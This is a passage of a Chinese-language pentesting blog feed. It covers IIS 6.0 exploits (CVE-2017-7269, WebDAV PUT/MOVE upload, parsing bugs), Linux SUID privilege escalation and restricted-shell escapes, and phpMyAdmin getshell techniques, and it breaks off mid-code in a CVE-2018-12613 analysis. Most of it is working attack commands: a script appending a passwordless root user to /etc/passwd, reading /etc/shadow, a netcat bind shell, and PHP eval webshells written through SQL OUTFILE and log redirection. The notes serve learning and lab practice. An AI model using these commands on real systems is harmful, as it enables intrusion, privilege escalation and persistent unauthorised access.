exp: <a href="https://github.com/zcgonvh/cve-2017-7269">zcgonvh/cve-2017-7269: fixed msf module for cve-2017-7269 (github.com)</a></p></blockquote><p>直接set rhost然后exploit</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201205002912.png" alt="屏幕截图 2020-12-05 002610"></p><p> 直接打是用在iis没有绑定主机时</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201205003708.png" alt="屏幕截图 2020-12-05 003701"></p><p>如果绑定了就需要输入物理路径长度 (如: <code>c:\inetpub\wwwroot\</code> 就是19)</p><p>修改路径为<code>c:\inetpub\wwwroot1111111</code></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201205160544.png" alt="QQ截图20201205160536"></p><p>使用脚本爆破(<a href="https://github.com/admintony/Windows-Exploit/tree/master/IIS6_WebDAV_Scanner">Windows-Exploit/IIS6_WebDAV_Scanner at master · admintony/Windows-Exploit (github.com)</a></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201205160655.png" alt="屏幕截图 2020-12-05 160647"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PhysicalPathLength 26</span><br></pre></td></tr></table></figure><p>然后即可攻击成功</p><h2 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h2><blockquote><p> 条件 IIS6.0  开启WebDAV和<strong>来宾用户写权限</strong></p></blockquote><p>使用PUT方式, 上传txt文件(直接上传asp文件会失败)</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201205173732.png" alt="屏幕截图 2020-12-05 173550"></p><p>然后利用move将txt文件修改为asp, 变为可执行脚本  蚁剑连接</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201205181520.png" alt="屏幕截图 2020-12-05 181456"></p><p>记得在web扩展中开启active server pages</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201205181308.png" alt="QQ截图20201205181300"></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201205181531.png" alt="屏幕截图 2020-12-05 181142"></p><h2 id="短文件名猜测"><a href="#短文件名猜测" class="headerlink" title="短文件名猜测"></a>短文件名猜测</h2><blockquote><p>windows下为兼容MS-DOS而生成的短文件</p><p>只显示前6个字符, 后面的字符使用<del>1,</del>2等等代替, 后缀只显示前3个字符. 并且全部以大写字母显示</p><p>文件名大于9或者后缀大于4才会生成短文件名, 使用<code>dir /x</code>查看短文件名</p></blockquote><p>影响版本</p><blockquote><p>IIS 1.0，Windows NT 3.51  </p><p>IIS 3.0，Windows NT 4.0 Service Pack 2  </p><p>IIS 4.0，Windows NT 4.0选项包</p><p>IIS 5.0，Windows 2000  </p><p>IIS 5.1，Windows XP Professional和Windows XP Media Center Edition  </p><p>IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition  </p><p>IIS 7.0，Windows Server 2008和Windows Vista  </p><p>IIS 7.5，Windows 7（远程启用<customErrors>或没有web.config）</p><p>IIS 7.5，Windows 2008（经典管道模式）</p><p>IIS使用.Net Framework 4时不受影响</p></blockquote><p>漏洞成因</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用短文件名访问存在的文件时会返回404, 否则返回400</span><br><span class="line">如存在aaaaaaaaaa.txt 短文件名为 AAAAAA~1.TXT的文件</span><br><span class="line">访问http://xxxxx/A*~1.*/.aspx会返回404</span><br><span class="line">通过逐步增加字符找出文件的文件名</span><br></pre></td></tr></table></figure><p>缺点:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">只能找出前6个字符和后缀的三个字符</span><br><span class="line">只能猜解有短文件名的文件</span><br><span class="line">不支持中文</span><br><span class="line">iis和.net都需要满足</span><br></pre></td></tr></table></figure><p>漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">升级.net到4.0及以上版本</span><br><span class="line">修改注册表, HKEY\ LOCAL MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem中的 NtfsDisable8dot3 Name Creation值为1,使其不创建短文件名</span><br></pre></td></tr></table></figure><h2 id="后缀解析漏洞"><a href="#后缀解析漏洞" class="headerlink" title="后缀解析漏洞"></a>后缀解析漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cer asa cdx 都会当做asp文件解析</span><br><span class="line">但是我在windows server 2003 + iis 6.0下只有cer可以</span><br></pre></td></tr></table></figure><p>漏洞原因:</p><p>​    当访问不存在文件时返回404, 访问不存在短文件名时返回400</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201205195549.png" alt="屏幕截图 2020-12-05 195037"></p><blockquote><p>版本: iis 6.0</p></blockquote><ol><li>xxx.asp文件夹里面的文件都会以asp解析</li></ol><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201205193319.png" alt="QQ截图20201205193209"></p><ol start="2"><li><p><code>;</code>截断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.asp;.txt会以asp文件执行</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201205193556.png" alt="QQ截图20201205193547"></p></li></ol><ol start="3"><li>遇到php文件时</li></ol><blockquote><p>iis 7.5</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当iis遇见php后缀文件时, 将其交给php处理, 当php开启cgi.fix_pathinfo时会处理文件, 如同nginx一样</span><br><span class="line">所以输入test.jpg/.php就会当场php处理</span><br></pre></td></tr></table></figure><p>参考: <a href="https://www.cnblogs.com/tssc/p/10255590.html">关于CGI和FastCGI的理解 - 天生帅才 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.anquanke.com/post/id/205098">.htaccess利用与Bypass方式总结 - 安全客，安全资讯平台 (anquanke.com)</a></p><p><a href="https://xz.aliyun.com/t/6801">Web中间件漏洞总结之Nginx漏洞 - 先知社区 (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/6783">https://xz.aliyun.com/t/6783</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权</title>
    <link href="/2020/11/22/Linux%E6%8F%90%E6%9D%83/"/>
    <url>/2020/11/22/Linux%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><h2 id="SUID-GUID-Stickybit"><a href="#SUID-GUID-Stickybit" class="headerlink" title="SUID GUID Stickybit"></a>SUID GUID Stickybit</h2><p>suid  4 ,  sgid 2 , Stickybit(粘滞位)  1</p><p>Umask: root的umask为0022 ,第一位是上一排提到的, 所以创建文件时就是777-022=755, 文件就是 755-111=644 除去x(执行权)</p><p>Stickybit(粘滞位)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修饰文件夹  文件只有自己和root用户可以修改</span><br><span class="line">如/tmp目录 所以用户都可创建修改自己文件, 但无法修改其他用户文件(无论是否同一个组)</span><br></pre></td></tr></table></figure><p>SGID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用于目录，在该目录下建立的所有文件和目录，属组都继承该目录的属组，且该组内其他成员修改目录内的文件时，其属主和属组都不改变!!  </span><br><span class="line">chmod g+s 目录</span><br><span class="line">当修改文件两个用户是other(other和组内成员)时会改变所属主(所属组不变)</span><br></pre></td></tr></table></figure><p>suid有啥用?</p><p>普通用户连/etc/shadow的查看权都没有, 但是要修改密码怎么办, 就是利用passwd的suid, 让passwd以root身份执行 赋予s权限需要本身具有x权限</p><p>chmod  4755  前面的4就是SUID</p><blockquote><p>SUID只对可执行文件有效</p><p>调用者对该文件有执行权</p><p>文件执行过程中 拥有文件所有者权限, 权限仅在执行过程中有效</p></blockquote><p>例子 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">赋予find文件s权限</span><br><span class="line">sudo chmod u+s /usr/bin/find  赋予此权限需要root</span><br><span class="line">find passwd -exec cat /etc/shadow \;  普通用户也可查看/etc/shadow文件了</span><br><span class="line"></span><br><span class="line">sudo chmod u-s /usr/bin/find  去除s权限</span><br><span class="line">find passwd -exec cat /etc/shadow \;提示权限不够了</span><br></pre></td></tr></table></figure><h2 id="找到SUID文件"><a href="#找到SUID文件" class="headerlink" title="找到SUID文件"></a>找到SUID文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>-perm用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find -perm mode(0777)  严格匹配, 不足前面自动添0</span><br><span class="line">find -perm -mode(xxxx) 将数字转换为二进制, 1则必须匹配,0则随意(满足要求即可)</span><br><span class="line">find -perm +mode(xxxx) 与-差别就是只需匹配一个权限位的1即可(满足其中一个要求即可)</span><br></pre></td></tr></table></figure><h2 id="一般可以利用的文件"><a href="#一般可以利用的文件" class="headerlink" title="一般可以利用的文件"></a>一般可以利用的文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Nmap</span><br><span class="line">Vim</span><br><span class="line">find</span><br><span class="line">Bash</span><br><span class="line">More</span><br><span class="line">Less</span><br><span class="line">Nano</span><br><span class="line">cp</span><br><span class="line">git</span><br><span class="line">wget</span><br></pre></td></tr></table></figure><h3 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在namp 2.02至5.21 拥有交互shell</span><br><span class="line">nmap -v</span><br><span class="line">namp --interactive  开启交互模式</span><br><span class="line">或者通过metaaploit开启</span><br><span class="line">exploit/unix/local/setuid_nmap</span><br></pre></td></tr></table></figure><h4 id="其他版本"><a href="#其他版本" class="headerlink" title="其他版本"></a>其他版本</h4><p><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p><p>利用nes脚本执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">创建一个nes脚本</span><br><span class="line">a.nes</span><br><span class="line">os.execute(&quot;/bin/bash&quot;)</span><br><span class="line">执行</span><br><span class="line">namp --script=a.nes</span><br><span class="line">但是可能不会成功</span><br><span class="line">方法二</span><br><span class="line">a.nes</span><br><span class="line"></span><br><span class="line">local file = io.open(&quot;/etc/passwd&quot;, &quot;a&quot;)</span><br><span class="line">file:write(&quot;root2::0:0::/root:/bin/bash\n&quot;)</span><br><span class="line">file:close()</span><br><span class="line"></span><br><span class="line">nmap --script=a.nes</span><br><span class="line">su root2  切换到root用户了</span><br></pre></td></tr></table></figure><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny /etc/shadow  可以读取所有文件</span><br><span class="line"></span><br><span class="line">开启shell</span><br><span class="line">vim.tiny</span><br><span class="line"># Press ESC key</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find passwd -exec &#x27;/bin/sh&#x27; \;</span><br><span class="line">或者</span><br><span class="line">find pentestlab -exec netcat -lvp 端口 -e /bin/sh \;</span><br><span class="line">netcat ip 端口</span><br></pre></td></tr></table></figure><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure><h3 id="less-more"><a href="#less-more" class="headerlink" title="less/more"></a>less/more</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd(/etc/shadow)</span><br><span class="line">进入后输入  !/bin/sh</span><br></pre></td></tr></table></figure><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git help config 或者git -p help</span><br><span class="line">输入!/bin/sh或者!/bin/bash</span><br></pre></td></tr></table></figure><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><p>利用wget下载添加有自定义root账户的passwd文件到<code>/etc/passwd</code></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><a href="https://gtfobins.github.io/#+suid">https://gtfobins.github.io/#+suid</a></p><h1 id="受限shell突破"><a href="#受限shell突破" class="headerlink" title="受限shell突破"></a>受限shell突破</h1><p><a href="https://www.freebuf.com/articles/system/188989.html">https://www.freebuf.com/articles/system/188989.html</a></p><h3 id=""><a href="#" class="headerlink" title="/"></a>/</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">直接利用</span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/dash</span><br></pre></td></tr></table></figure><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将shell文件移到用户目录然后执行</span><br><span class="line">cp /bin/bash ubash</span><br><span class="line">cp /bin/sh ush</span><br></pre></td></tr></table></figure><h3 id="ftp-gdb-man-git-vim-vi-more-less"><a href="#ftp-gdb-man-git-vim-vi-more-less" class="headerlink" title="ftp gdb man git vim/vi more/less"></a>ftp gdb man git vim/vi more/less</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp</span><br><span class="line">ftp &gt; !/bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb</span><br><span class="line">gdb &gt; !/bin/sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man ls</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git help status</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim/vi</span><br><span class="line">:!/bin/sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more/less</span><br><span class="line">!&#x27;sh&#x27;</span><br></pre></td></tr></table></figure><h3 id="pinfo"><a href="#pinfo" class="headerlink" title="pinfo"></a>pinfo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pinfo ls</span><br><span class="line">!</span><br><span class="line">执行命令</span><br></pre></td></tr></table></figure><h2 id="set-shell"><a href="#set-shell" class="headerlink" title="set shell"></a>set shell</h2><p>查看环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export -p</span><br></pre></td></tr></table></figure><p>如果为-rx则我们无法写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在vim/vi中设置shell</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line">或者在现有shell修改环境变量</span><br><span class="line">export PATH=$PATH:/bin</span><br></pre></td></tr></table></figure><h2 id="编程语言提权"><a href="#编程语言提权" class="headerlink" title="编程语言提权"></a>编程语言提权</h2><p>python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import os;os.system(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>php：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -a then exec(&quot;sh -i&quot;);</span><br></pre></td></tr></table></figure><p>perl：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></pre></td></tr></table></figure><p>lua：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.execute(&#x27;/bin/sh&#x27;).</span><br></pre></td></tr></table></figure><p>ruby：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpmyadmin漏洞利用</title>
    <link href="/2020/11/22/phpmyadmin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/11/22/phpmyadmin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="phpmyadmin漏洞利用"><a href="#phpmyadmin漏洞利用" class="headerlink" title="phpmyadmin漏洞利用"></a><em>phpmyadmin</em>漏洞利用</h1><h2 id="获取版本信息"><a href="#获取版本信息" class="headerlink" title="获取版本信息"></a>获取版本信息</h2><p>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">readme.php</span><br><span class="line">README</span><br><span class="line">changelog.php</span><br><span class="line">Change</span><br><span class="line">Documetation.html</span><br><span class="line">Documetation.txt</span><br><span class="line">translators.html</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-211450.jpg"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><blockquote><p>使用爆破工具 , 或者得到账号密码 直接登录</p></blockquote><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">条件</span><br><span class="line"></span><br><span class="line">拥有root权限</span><br><span class="line">网站路径</span><br><span class="line">拥有写权限</span><br></pre></td></tr></table></figure><ol><li>获取路径方法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phpinfo  </span><br><span class="line">某些网站安装完成后 测试文件可能没有删除 phpinfo.php、info.php、1.php、test.php</span><br><span class="line"></span><br><span class="line">查寻mysql路径猜测web路径</span><br><span class="line">select @@datadir as dataPath from dual ;</span><br><span class="line">或者</span><br><span class="line">show variables Like &#x27;%datadir%&#x27;;</span><br><span class="line"></span><br><span class="line">load_file读取网站配置文件 index.php 或者 /etc/passwd等等</span><br></pre></td></tr></table></figure><ol start="2"><li>查询写权限</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;secure_file_priv&#x27;</span><br><span class="line"></span><br><span class="line">secure_file_priv作用</span><br><span class="line">1. 限制load data, select ... outfile, load_file()等</span><br><span class="line">2. 值为null时 , 表示限制mysql为不允许导入导出</span><br><span class="line">3. 值为/tmp/时 , 表示导入 导出只在/tmp目录下</span><br><span class="line">4. 没有值时表示不限制</span><br></pre></td></tr></table></figure><ol start="3"><li>写一句话</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_POST[123]);?&gt;&quot; into outfile &quot;\\xx\\xx\\xxx.php&quot;</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-214348.jpg"></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-214438.jpg" alt="批注 2020-07-26 214438"></p><h3 id="利用日志getshell"><a href="#利用日志getshell" class="headerlink" title="利用日志getshell"></a>利用日志getshell</h3><ol><li><p>开启日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看日志是否开启</span><br><span class="line">SHOW VARIABLES LIKE &#x27;general_log%&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-214730.jpg" alt="批注 2020-07-26 214730"></p></li><li><p>开启日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">开启日志</span><br><span class="line">set global general_log=&#x27;on&#x27;;</span><br><span class="line">修改日志路径</span><br><span class="line">set global general_log_file=&quot;xx\\xx\\xx\\xx.php&quot;;</span><br><span class="line">查看开启情况</span><br><span class="line">SHOW VARIABLES LIKE &quot;general_log%&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-215200.jpg" alt="批注 2020-07-26 215200"></p></li><li><p>写入shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">任意执行sql语句</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-215351.jpg" alt="批注 2020-07-26 215351"></p></li></ol><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-215338.jpg" alt="批注 2020-07-26 215338"></p><h3 id="cve-2018-12613后台文件包含"><a href="#cve-2018-12613后台文件包含" class="headerlink" title="cve-2018-12613后台文件包含"></a>cve-2018-12613后台文件包含</h3><p>版本4.8.0和4.8.1</p><p>漏洞分析</p><p><code>index.php  55-63行</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1</span>. 存在target参数</span><br><span class="line"><span class="number">2</span>. 参数为字符串</span><br><span class="line"><span class="number">3</span>. 不能以index开头</span><br><span class="line"><span class="number">4</span>. target里不能含有黑名单字符</span><br><span class="line"><span class="number">5</span>. 进行checkPageValidity()函数检查</span><br></pre></td></tr></table></figure><p><code>$target_blacklist</code></p><p><code>index.php 50-52行</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_blacklist</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>checkPageValidity()函数</code></p><p><code>Core.php 443-476行</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//$whitelist变量是否为空 , 为空就赋值为self::$goto_whitelist;</span></span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span 